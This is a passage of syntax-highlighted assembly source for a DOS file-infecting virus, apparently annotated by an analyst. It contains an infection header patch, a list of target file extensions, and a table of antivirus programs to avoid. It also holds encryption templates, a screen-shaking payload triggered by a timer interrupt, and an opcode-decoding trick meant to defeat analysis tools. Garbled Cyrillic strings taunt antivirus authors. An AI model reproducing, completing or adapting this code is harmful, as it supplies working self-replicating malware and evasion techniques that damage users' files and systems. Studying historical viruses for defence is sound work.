                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'StealthedMetamorphicCrazyForcedSynthesatedRandom'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MegaLayerEncryptionProgressionMutationEngine'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SeekAndDestroyerGenerator'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">msg_russian</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ë ¥é¥ ­¥ ¢ë¡p®á¨« íâ®â suxx ­  ¯®¬®©ªy ?! :)'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_signature</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">_partpag</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9090h</span><span class="sc0">
</span><span class="sc5">_pagecnt</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">20CDh</span><span class="sc0">
</span><span class="sc5">_relocnt</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_hdrsize</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_minmem</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_maxmem</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_reloss</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_exesp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_chksum</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_exeip</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_relocs</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_tabloff</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_overlay</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">word_ofs1C</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Unused!</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Unused!</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Unused!</span><span class="sc0">

</span><span class="sc5">jmp_com</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; JMP xxxx (JMP start virus)</span><span class="sc0">
</span><span class="sc5">jmp_vir_l</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">jmp_vir_h</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ¬áâî ,¨ ¬áâï ¬®ï ã¦ á­ ... ü S.S.R.'</span><span class="sc0">

</span><span class="sc5">file_month</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">returnAX_fffn</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">attributes</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pklite_com</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 0 = Not compressed with Pklite</span><span class="sc0">
                                </span><span class="sc1">; 1 = Compressed with Pklite</span><span class="sc0">
</span><span class="sc5">jmp_dest</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_patchcom2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">inc_ofs_patch1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encrypted_byte?</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 0FFh -&gt; Yes</span><span class="sc0">
                                </span><span class="sc1">; 0    -&gt; No</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Unused!</span><span class="sc0">
</span><span class="sc5">_FFFF</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc5">infection_count</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encrypted_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">host_type</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 0 = COM</span><span class="sc0">
                                </span><span class="sc1">; 1 = EXE</span><span class="sc0">
</span><span class="sc5">ofs_vircode</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">table_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PAR'</span><span class="sc0">   </span><span class="sc1">; Windows swap file</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PIF'</span><span class="sc0">   </span><span class="sc1">; Windows PIF</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ICO'</span><span class="sc0">   </span><span class="sc1">; Windows Icon</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'°°°'</span><span class="sc0">   </span><span class="sc1">; ???</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PAS'</span><span class="sc0">   </span><span class="sc1">; Pascal sources</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BAS'</span><span class="sc0">   </span><span class="sc1">; Basic sources</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FRQ'</span><span class="sc0">   </span><span class="sc1">; ???</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'311'</span><span class="sc0">   </span><span class="sc1">; ???</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'312'</span><span class="sc0">   </span><span class="sc1">; ???</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TPU'</span><span class="sc0">   </span><span class="sc1">; Turbo Pascal Units</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GIF'</span><span class="sc0">   </span><span class="sc1">; GIF graphic format</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'JPG'</span><span class="sc0">   </span><span class="sc1">; JPG graphic format</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NLM'</span><span class="sc0">   </span><span class="sc1">; Novell Netware (?)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'STM'</span><span class="sc0">   </span><span class="sc1">; ???</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MOD'</span><span class="sc0">   </span><span class="sc1">; MOD song format</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CPP'</span><span class="sc0">   </span><span class="sc1">; C++ sources</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DOT'</span><span class="sc0">   </span><span class="sc1">; WinWord</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; End of table ÿ</span><span class="sc0">

</span><span class="sc5">av_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DR'</span><span class="sc0">    </span><span class="sc1">; DRWEB</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AI'</span><span class="sc0">    </span><span class="sc1">; AIDSTEST</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AD'</span><span class="sc0">    </span><span class="sc1">; ADINF</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CO'</span><span class="sc0">    </span><span class="sc1">; COMMAND.COM</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'HI'</span><span class="sc0">    </span><span class="sc1">; HIEW</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AV'</span><span class="sc0">    </span><span class="sc1">; AVP, AVSCAN     &lt;ÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WI'</span><span class="sc0">    </span><span class="sc1">; WIN                         ³</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KE'</span><span class="sc0">    </span><span class="sc1">; KEYB                        ³</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'US'</span><span class="sc0">    </span><span class="sc1">; USER.EXE (Windows file)     ³</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GD'</span><span class="sc0">    </span><span class="sc1">; GDI.EXE (Windows file)      ³</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AV'</span><span class="sc0">    </span><span class="sc1">; Already checked!!! ÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'##'</span><span class="sc0">    </span><span class="sc1">; End of table</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Unused!</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' yâ¨­ëç !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'¥p¥¨¬¥­®¢ âì ­¥ § å®â¥«,¤  ! ë á ¬ íâ®£® å®â¥« ! '</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'â® ¢®©­  !!! ­ ç «  ¤®ª¨ ­ yç¨áì ¯¨á âì (á¬ AVPVE)!'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ®¡é¥¬,HH H ®áâ ¢«ï¥â £­¥âãé¥¥  ¢¯¥ç â«¥­¨¥'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'®â çà¥§¬¥à­ëå ¯®âã£ £®á¯®¤¨­  ¢¨à«¨áâ®¯¨á â¥«ï...'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Exe-Pklite â®«ìª® ¢ 3.13 ­ ª®¯ «...¥¤­ë¥ î§¥pë ­ ¢¥p­®¥'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'â¥¡ï § ¤®«¡ «¨,  ?  ª íâ®:¢á¥ :),  ®­ ®¯ïâì ¯®ï¢¨«áï !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'H   -   H   :SND ®¤­ ª®...'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RES ­¥ ®âí¬y«¨« - ¯®«yç¨ 32ReGs,@$%^, !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Revenge - â® ¤ ¦¥ ­¥ è¢ ¡p ,  ¯ë«¥á®á á ï¤¥p­®© ­ ª çª®© ¨'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'âyp¡®-­ ¤¤y¢®¬ ¤«ï â¢®¥© ­¥áç áâ­®©  yâ¨­ë ¨ ®áâ «ì­ëå SHITH!'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[®áâ «ì­ë¥ ­ ¥§¤ë ¯®áª¨¯ ­ë]'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'¢ ¦ ¥¬ë© £-­  á¯¥páª¨© ! ç¥­ì ¡« £®¤ p¥­ §  ¯®¤p®¡­®¥ ®¯¨á ­¨¥ !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'­¥ ®ç¥­ì ¯®­p ¢¨«®áì,thanks. £¨ ¢ ¤®ª¥ ¥áâì ­® ¢á¥ p ¢­® -  !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RES - ­¥ ¯®«¨¬®pä­ë© £¥­¥p â®p,  Randomer'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'® íâ®¬y ¯®¢®¤y ï y¤ «¨« .AVB ¨§ å®p®è¥£® á¯¨áª  ! Best®¢ë¥ p¥£ p¤ë ¨'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'py«¥áë !  AVP - íâ® ªpyâ®,Web - real SUXX !'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'  ¡ £¨ ¨ £«îª¨ ­¥ ®â¢¥ç î (¢ ®á®¡¥­­®áâ¨ §  çy¦¨¥)!'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ü S.S.R.'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'P.S. remember:8086 - ­¥ 486,  emul - ­¥ TD386'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">


</span><span class="sc5">encrypt_instructions</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">int_24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">int_1c</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">tick_counter</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">tick_counter</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc2">6000h</span><span class="sc0">      </span><span class="sc1">; Time to shake screen?</span><span class="sc0">
                                                </span><span class="sc1">; (6000h ticks = aprox. 22 min.)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">shake_screen</span><span class="sc0">            </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">shake_screen</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">tick_counter</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Continue with shake</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C4h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; EGA: sequencer address reg</span><span class="sc0">
                                </span><span class="sc1">; clocking mode. Data bits:</span><span class="sc0">
                                </span><span class="sc1">; 0: 1=8 dots/char; 0=9 dots/char</span><span class="sc0">
                                </span><span class="sc1">; 1: CRT bandwidth: 1=low; 0=high</span><span class="sc0">
                                </span><span class="sc1">; 2: 1=shift every char; 0=every 2nd char</span><span class="sc0">
                                </span><span class="sc1">; 3: dot clock: 1=halved</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; Get random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; AL:=[0 | 1]</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; EGA port: sequencer data register</span><span class="sc0">
                                </span><span class="sc1">; Shake screen</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">tick_counter</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int_6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_IP</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_CS</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_CS</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_IP</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_CS</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">caller_IP</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0F0h</span><span class="sc0">   </span><span class="sc1">; Opcode 0F0? (Used by SND)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_i6</span><span class="sc0">                 </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get next byte</span><span class="sc0">
                </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Using AX?</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">encode_movax</span><span class="sc0">            </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0B4h</span><span class="sc0">   </span><span class="sc1">; Encode MOV AH,xx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get value of AH</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Decrypt it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">; and store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">21CDh</span><span class="sc0">         </span><span class="sc1">; Encode int 21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_i6</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">encode_movax</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">   </span><span class="sc1">; Encode MOV AX,xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get value of AX</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Decrypt it</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; and store it</span><span class="sc0">
